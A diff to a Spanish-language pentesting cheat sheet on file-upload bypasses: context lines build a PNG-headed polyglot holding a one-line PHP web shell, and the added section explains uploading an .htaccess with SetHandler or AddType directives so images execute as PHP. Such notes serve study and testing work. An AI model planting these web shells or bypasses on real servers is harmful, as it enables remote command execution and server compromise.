@@ -101,3 +101,11 @@ echo -ne '\x89\x50\x4E\x47\x0D\x0A\x1A\x0A' > mime_shell.php.png
 # Agregar el código PHP correctamente escapado
 echo '<?php system($_REQUEST["cmd"]); ?>' >> mime_shell.php.png
 ```
+
+### Subir .htaccess para ejecutar php
+- Se puede intentar subir un archivo .htaccess para ejecutar el archivo php.
+- `SetHandler application/x-httpd-php`
+- `AddType application/x-httpd-php .jpg`
+- etc
+- Esto sirve para ejecutar archivos php en un servidor web que no permite la ejecución de archivos php.
+    - Muchas veces no está correctamente bloqueado el acceso a subir archivos .htaccess, por lo tanto podemos subir un archivo .htaccess y ejecutar el archivo php.
